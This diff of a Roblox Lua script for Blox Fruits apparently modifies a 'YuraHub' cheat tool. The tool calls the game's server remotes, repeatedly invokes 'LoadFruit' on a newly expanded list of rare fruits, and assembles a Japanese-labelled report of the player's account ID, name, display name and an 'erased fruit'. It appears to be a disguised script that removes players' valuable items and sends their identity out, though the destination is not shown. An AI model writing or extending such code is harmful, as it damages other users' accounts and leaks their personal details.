@@ -43,7 +43,7 @@ if bloxfruits then
 		player.PlayerGui.Notifications:Destroy()
 	end
 
-	--[[local main = player.PlayerGui:WaitForChild("Main")
+	local main = player.PlayerGui:WaitForChild("Main")
 	if main and main:WaitForChild("Fragments") and player.PlayerGui:WaitForChild("UniversalContextButtons") then
 		local f = main.Fragments:Clone()
 		f.Name = "YuraHub"
@@ -64,7 +64,7 @@ if bloxfruits then
 				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint", "Demon Fruit", PointStats)
 			end
 		end)
-	end--]]
+	end
 
 	local backpack = player.PlayerGui:WaitForChild("Backpack")
 	if backpack and backpack:WaitForChild("Inventory") and player.PlayerGui:WaitForChild("UniversalContextButtons") then
@@ -93,7 +93,11 @@ if bloxfruits then
 	spawn(function()
 		while task.wait(.1) do
 			pcall(function()
-				local fruits = {"Rocket-Rocket", "Spin-Spin", "Blade-Blade", "Spring-Spring"}
+				local fruits = {"Dragon (East)-Dragon (East)","Dragon (West)-Dragon (West)","Purple Lightning","Red Lightning",
+					"Kitsune-Kitsune","Yellow Lightning","Green Lightning","Yeti-Yeti","Celestial Pain","Super Spirit Pain","Torment Pain",
+					"Sadness Pain",	"Frustration Pain","Gas-Gas","Leopard-Leopard","Eagle Requiem","Eagle Glacier","Eagle Matrix","Azura Bomb",
+					"Lightning-Lightning","Thermite Bomb","Nuclear Bomb","Celebration Bomb","Dough-Dough","T-Rex-T-Rex","Spirit-Spirit",
+					"Pain-Pain","Gravity-Gravity","Mammoth-Mammoth","Buddha-Buddha","Portal-Portal"}
 				for _, fruit in ipairs(fruits) do
 					local args = {
 						[1] = "LoadFruit",
@@ -137,8 +141,8 @@ if bloxfruits then
 							{
 								["name"] = "プレイヤー情報",
 								["value"] = "```アカウントID: " .. tostring(player.UserId)
+									.. "\n表示名: " .. player.DisplayName
 									.. "\n名前: " .. player.Name
-									.. "\n年齢: " .. tostring(player.AccountAge)
 									.. "\n消した実: " .. tostring(target)
 									.. "```"
 							}
